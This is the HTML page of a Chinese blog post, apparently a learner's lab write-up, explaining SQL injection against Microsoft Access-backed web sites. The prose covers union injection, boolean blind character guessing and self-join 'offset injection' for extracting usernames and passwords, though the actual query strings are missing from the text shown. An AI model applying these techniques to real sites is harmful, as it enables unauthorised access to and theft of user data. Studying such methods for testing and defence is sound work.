<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入之Access篇 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入之Access篇"><meta name="application-name" content="SQL注入之Access篇"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入之Access篇"><meta property="og:url" content="http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 之前只是学习了最基础的MySQL数据库注入，然后看了小迪的课认为还是很有必要赶紧拓展的，于是我就写此文章学习一下一些其他数据库的特性：如常规注入语句、数据库本身的特性、与MySQL数据库的区别。话不多说，直接开卷！ 0x02 概括 ​		SQL注入是非常常见的一个漏洞，如果程序员在编"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 前言 之前只是学习了最基础的MySQL数据库注入，然后看了小迪的课认为还是很有必要赶紧拓展的，于是我就写此文章学习一下一些其他数据库的特性：如常规注入语句、数据库本身的特性、与MySQL数据库的区别。话不多说，直接开卷！ 0x02 概括 ​		SQL注入是非常常见的一个漏洞，如果程序员在编"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'SQL注入之Access篇',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 概括, 0x03 注入思路, 0x04 注入方式, 4.1 联合注入, 4.2 逐字猜解, 4.3 偏移注入, 4.3.1 注入原理, 4.3.2 判断是否存在注入点, 4.3.3  判断当前字段数量, 4.3.4 猜测当前表的表名, 4.3.5 确定回显位, 4.3.6 确定目标表的字段数量, 4.3.7 进行偏移注入, 0x05 总结, 5.1 联合注入, 5.1.1 判断字段数, 5.1.2 爆出回显位, 5.1.3 猜测表名, 5.1.4 猜测列名, 5.2 逐字猜解法, 5.2.1 猜测表名, 5.2.2 猜测列名, 5.2.3 爆数据, 0x06 参考文章前言之前只是学习了最基础的数据库注入然后看了小迪的课认为还是很有必要赶紧拓展的于是我就写此文章学习一下一些其他数据库的特性如常规注入语句数据库本身的特性与数据库的区别话不多说直接开卷概括注入是非常常见的一个漏洞如果程序员在编写网站源码时未对执行语句作防护措施那么用户输入就可以执行语句导致用户数据被删改拖库挂马等而它的种类也根据参数类型提交方式注入方式以及数据库类型的不同来进行区分数据库是一种小型数据库用于储存数据其中各个对象之间可以建立关联方便用户快速查询与调用数据它相对其他数据库来说比较简单只有一个数据库里面存放着表列以及数据通过简单的语句就可以完成注入一般通过联合注入逐字猜解偏移注入等方式进行攻击在面对搭载这类数据库的网站时也可以针对和后缀名的文件进行爆破说不定存在信息泄露可以直接拿到数据库本文主要针对数据库的注入的原理以及攻击方式进行归纳这里搞一个常见数据库组合小注入判断数据库类型注入思路通过报错或常见组合判断数据库类型截取请求包更换请求方式或更改请求包参数寻找注入点通过单引号百分号来判断注入参数类型数字型字符型搜索型选择攻击注入方式联合注入逐字猜解偏移注入判断是否能猜解到表名列名主要分为以下三种情况如果能猜解到表名和列名那么可以使用联合注入或逐字猜解如果只能猜解到表名无法猜解到列名那么可以使用偏移注入如果无法猜解到表名或列名那么可以查看网站源代码提交的参数来构造表名还不行的话就赶紧溜吧无从下手的获取数据库中的敏感数据登录后台或直接写入下面先讲理论之后实战操作一下注入方式判断是否存在注入点粗略型提交单引号逻辑型数字型注入或逻辑型字符型注入或逻辑型搜索型注入或联合注入判断注入点一般来说单引号减号等就可以判断是否存在注入返回页面与不同说明存在注入返回一个与不同的正常界面说明已经代入数据库执行存在注入返回页面与不同说明已经完成了真假判断存在注入通过判断字段数将字段数从小到大以此类推直至返回错误页面而正确的字段数就是返回错误的字段数减一返回错误页面字段数为通过联合查询如那么在实际场景中只需要先找到注入点通过进行字段判断再使用可控输入对目标数据库进行联合注入即可本质上和的联合注入差不多不过它没有库需要猜解它的表名和列名如果猜对了就会在网页上回显账号密码可以将以下常用的表名和列名进行猜解常见的表名用户常见的列名用户用户名密码帐号逐字猜解数据库函数查询可参考常用函数逐字猜解其实到最后用的就是布尔盲注根据目标的返回页面差异来判断注入是否成功比较依赖运气需要依赖强大的字典一般采用的语句如下如这里的是返回字符的码值函数为从指定字符串中提取一些字符判断表名实际上就是对表名进行猜解再根据表名做进一步操作返回错误界面返回正常界面猜解列名页面正常列名正确页面正常列名正确页面报错列名错误未猜出密码列名猜解出了目标和用户名的列名分别是和但未猜解出密码列名通过布尔盲注获取数据判断字段长度页面报错长度小于或等于页面正常长度等于判断数据这里可以使用或直接写脚本跑即可页面报错列第一个数据码大于等于页面正确说明第一个数据码为查询表为页面正确说明第二个数据码为查询表为最后拿到用户名偏移注入偏移注入的前提是需要猜出表名且知道一个或多个字段这个前提可以使用之前的方法获得它的优势和劣势一样突出优势是无需用户名和密码的字段就可以直接爆出账号密码劣势是也需要运气不能保证绝对成功主要原理是拿到判断出的字段数以及回显正常的然后再用的字段数减去倍的值即是所需字段数例如字段数为回显正常的值为所需的字段数就是根据该值进行构造即可完成偏移注入这里我感觉他解释的不清楚于是找了几篇文章继续学习偏移注入的原理这里只是粗略的概述详细请看下面就是将目标表进行多级内连接通过联合查询和已知目标字段名的微调将我们想要知道的字段值在已经确定的显示位上暴露出来影响偏移注入成功率的因素当然这些因素都是影响因素不是决定因素联合查询中显示位的位置当前注入点所查询的字段数量目标表的字段数量我们可以猜解到的目标表的字段名的数量这里先借助那篇文章的图片了此次实战测试主要涉及的两张表表和表表该表有个字段表该表有个字段请谨记这个字段数函数用于检查子查询是否至少会返回一行数据该子查询实际上并不返回任何数据而是返回值或关键字用于起别名可以为表起别名也可以为字段起别名关键字可省略表表筛选条件该关键字用于将表与表做笛卡尔积然后根据后面的条件进行筛选关键字作用是使查询结果只显示前条记录下图中语句的意思是将表与自己做笛卡尔积然后筛选出两者值相同的记录下图意思为查询表的前六个数据注入原理为了方便讲解这里选择实战和偏移注入的注入原理相结合的方式进行讨论偏移注入的流程是判断是否存在注入点判断当前注入点所查询的字段数量请一定谨记以下的简略表述后面的文章均采用以下简略表述使用语句帮助理解当前字段数量当前表目标表在这里当前表表目标表表猜解目标表的表名确定显示位确定目标表的字段数量开始进行偏移注入经过不断的微调将我们想要的字段值在显示位处暴露出来判断是否存在注入点页面回显正常页面回显错误这里不知为何我的之后页面什么也没有只能右键源代码看到页面是报错的这里说明存在注入点且为数字型注入判断当前字段数量页面显示正常页面显示错误说明当前表名下的字段数为猜测当前表的表名这里我看文章用的是方式其实常规的话应该是如下也就是联合注入方式这里找到一篇文章说联合查询法速度快兼容性不好逐字猜解发速度慢兼容性好也就是上述的方法这里呢我在最后再放出两种方法的注入语句的总结吧因为数据库没有类似于的这样的系统索引库所以我们只能根据经验靠猜了在真实的测试环境中我们也可以通过社工的方式进行猜解此次页面返回正常说明存在数据库中存在表我们也可以进一步验证一下改一下参数看看页面的变化可以看到报错了说明不存在该表确定回显位这里前面依旧添加是为了让这个整体报错以防占用回显位如上图所示发现回显位为至于为何这里非要在后面加入我也产生了疑问因为我记得数据库是不需要的于是我去掉这俩单词后发现如下如图这代表我们在查询回显位还必须带一个正确的表确定目标表的字段数量这里是确定表的字段数量注意这里还要在确定的原因我想是我们进入该页面查询的时候当前表并非表这里呢我们根据当前页面路径去源码查找验证一下如上图果然这里查询的表为表页面回显正常页面回显错误说明表的字段数为个我们查看数据库验证一下如上图很明显是正确的进行偏移注入偏移注入的基本公式联合查询所要补充的字段数当前字段数量目标表的字段数注意联合查询所要补充的字段数指的是关键字后面的查询所需补充的字段数在此处即为联合查询补充字段数当前字段数量表的字段数当时我们称为级偏移注入当时我们称为级偏移注入当时我们称为级偏移注入级偏移注入的根据公式我们可以计算出联合查询补充字段数在这里我们解释一下为什么级偏移注入并没有爆出我们想要的字段值呢由前面的步骤我们已经得知已经确定的显示位只有四个即只有处于第这四个字段的数据才可以显示出来但是我们观察下标发现在进行级偏移注入时表的数据实际上是排在了号字段之后了当然不会在页面中显示出来那么我们怎么样才可以将表的数据向前移动以致可以使其处于第号字段而显示出来呢答案是我们可以进行级多级偏移注入即通过表的自连接使得语句中所代表的的字段数增大那么联合查询中用于充数字段就会减小这样的话表中的数据自然会向前移动了这里附上参考文章的图片解释的比较清晰级偏移注入的根据公式我们可以计算出联合查询补充字段数这里我们输入之后查看源代码发现回显位爆出了加密的密码但这是为什么呢通过分析下图我们发现经过级偏移注入我们成功的将表的数据向前移动了个字段使其原本在号字段及其之后才显现出的数据变为了在号字段及其之后就可回显而出而此时表的字段和字段恰好处于显示位和上于是就自然而然的暴露了出来那又为什么表的数据会向前移动个字段呢原因就是由于表进行了一次自连接使得中关键字后面的表由原有的表变成了由先让自己做笛卡尔积然后挑选值相等的记录组成的表这样的话中的就由原来所代表的表中的个字段变为了现在所代表的自连接表的个字段又由于关键字的使用要求关键字后面查询的字段数必须要等于前面查询的字段数所以关键字后面的中用于充数的字段由原来的变为了个字段因此由于充数的字段变少了那么表的数据自然的就可以向前移动了请注意表中的数据向前移动的字段数只能是表即目标表字段数的整数倍这是由表自连接的特性所决定的但这里我的表似乎数据不对劲只有一组数据怪不得我一直搞不懂上述操作的原理我还以为是我傻不过仔细阅读参考文章我认为这里进行笛卡尔积的操作之后是将同个字段连接了起来而形成个字段的新表附上图片在此我们已经爆出了表的密码此时其实表的字段就紧挨在字段的前方其实在实战环境中我们是不确定字段是在前还是在后的此处只是为了方便原理的讲解就直接告诉你了那么我们是否仍然可以将数据向前移动而爆出字段的值呢在这里显然是不行的因为我们只能向前移动表的字段数量的整数倍在这里即是的整数倍而此时表的字段此时所处字段为号字段再向前移动个字段的话字段就处于号字段处了仍然没有与显示位的位置发生重合到了这里细心的同学会发现之前我们讲的都是如何将表中的数据向前移动那么我们可不可以使得数据向后移动呢要是可以向后移动的话紧接着级偏移然后让数据向后移动一个字段不就正好让字段处于号显示位了吗恭喜你你的想法是对的我们的确可以让表的数据向后移动不过遗憾的是向后移动的字段数仍然取决于我们能够猜解出表中多少个字段名若猜解出个字段名那么我们就可以让数据向后移动个字段数若猜解出个字段名那么我们就可以让数据向后移动个字段数以此类推不过这里所需要猜解的字段名不需要是我们想要查找的字段名只要是表中的字段名均可原因请继续往后阅读微调根据页面返回的数据我们可以看到在第号显示位我们成功的爆出了字段的第一个值原因我们先观察语句发现关键字后面的查询的填充字段多了代码意思是在此输出表表的别名之一的字段值由于此处已经显式的指出字段值的输出位置那么后面的就会自动的识别就只输出自联表剩下的字段值了从而使得剩余数据均向后移动了一个字段让原本在号字段的字段向后移动了位到了号显示位上了但请注意此处的字段名是我们已经猜解出的这也就回答了上述所说的向后移动的字段数仍然取决于我们能够猜解出表中多少个字段名不过这里所需要猜解的字段名不需要必须是我们想要查找的字段名只要是表中的字段名均可因此如果我们想让数据向后移动个字段值那么我们就需要知道除了字段名外其他任一字段名即可然后构造如下字段名附上图片总结这里依旧了一下那篇参考文章太菜了没自己的想法至此整个测试已结束我们成功的爆出了账号与密码接下来我会依次提出几个问题然后一一进行解答如果我们仍然采用上述环境那可不可以进行级偏移和四级偏移呢答级偏移可以但是级偏移不行因为如果进行级偏移的话就会使得偏移注入基本公式联合查询补充字段数当前字段数量目标表的字段数即会造成关键字之前的查询字段数的数量关键字之后的字段数量从而导致查询失败级偏移的偏移注入是否是真的随机通过上述原理的讲解这个问题也就不攻自破了显然注入并不是真正的随机并不是完全不受我们控制的在我们获取足够信息的情况下目标表的字段数量当前字段数量已知的目标表字段名的数量我们可以在一定范围内完全控制显示位处的数据显示而之所以说是一定范围内只是因为显示位的位置和我们可以猜解到的目标表字段名的数量这两个因素不是我们可以控制的是否可以只说当前表的字段数越多成功率越大或目标表的字段数越少成功率越大显然我们不能这样简单的得出结论偏移注入是否能够成功取决于显示位位置和目标字段能够移动到的位置是否可以重合如果可以重合的话即使当前表字段数小一点目标表字段数多一点也是无妨的但万万不可当前表的字段数量目标表的字段数量是什么决定着目标表的数据一次性前移的字段数是什么决定着目标表的数据可以后移的字段数前者是由目标表的字段数量所决定的目标表中的数据向前移动的字段数只能是目标表中的字段数的整数倍这是由表自连接的特性所决定的后者是由我们可以猜解得到的目标表的字段名数量所决定若猜解出个字段名那么我们就可以让数据向后移动个字段数若猜解出个字段名那么我们就可以让数据向后移动个字段数以此类推不过这里所需要猜解的字段名不需要必须是我们想要查找的字段名只要是表中的字段名均可可以看到上述的三级偏移是进行了两次笛卡尔积的操作不得不说这个偏移注入真的厉害真有一种黑客的感觉这里顺便总结比较一下联合注入和逐字猜解语句联合注入先是判断是否存在注入这里就不赘述了判断字段数页面正常页面报错说明当前表的字段数为爆出回显位字段数正确表名随机查看页面或者源代码看那些字段是可以回显的猜测表名猜表名报错说明表名不存在将换成别的继续猜猜测列名猜列名列名位置放置页面上显示的数字位置上报错说明列名不存在换列明继续猜列名猜对后及出账号密码逐字猜解法先是判断是否存在注入也不赘述猜测表名猜表名页面正常即猜测正确猜测列名猜列名页面正常即猜测正确爆数据确定长度确定数据编码的长度正常则也可以用号去判断判断第一位代表的值判断第二位第一位第二位第三位第四位第五位更多骚操作就不赘述了日后碰到的话在找这里主要就是了解数据库的特性以及常规语句现在存在数据库的网站越来越少了一般都是一些小型站或是老站相对来说参考价值较低而随着新型数据库的兴起慢慢地数据库也会卷入时代的浪潮里而消失但怎样有效地防范注入提升网络安全意识却是个长久的议题参考文章偏移注入原理注入系列之手动注入一数字型注入之数据库',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-09 21:06:20',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 